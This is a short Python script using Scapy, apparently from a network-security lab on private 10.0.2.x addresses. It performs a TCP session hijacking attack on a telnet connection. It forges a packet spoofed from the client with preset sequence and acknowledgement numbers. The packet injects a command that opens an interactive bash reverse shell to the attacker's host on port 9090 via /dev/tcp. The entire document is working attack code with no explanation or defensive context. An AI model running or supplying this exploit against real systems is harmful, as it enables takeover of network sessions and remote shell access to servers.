#!/usr/bin/python


from scapy.all import *


client_IP = "10.0.2.6"
server_IP = "10.0.2.4"
attacker_IP = "10.0.2.5"

telnet_port = 23
target_port = 44072
attack_port = 9090

flag = "A" # ACK bit

seq_num = 1036068323
ack_num = 757663083

# create ip packet
ip = IP(src=client_IP, dst=server_IP)

# create tcp packet
tcp = TCP(sport=target_port, dport=telnet_port, flags=flag, seq=seq_num, ack=ack_num)

# create malicious command data
malicious_command = "/bin/bash -i > /dev/tcp/{}/{} 0<&1 2>&1\r\n".format(attacker_IP, attack_port)
data = malicious_command

# construct the packet
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
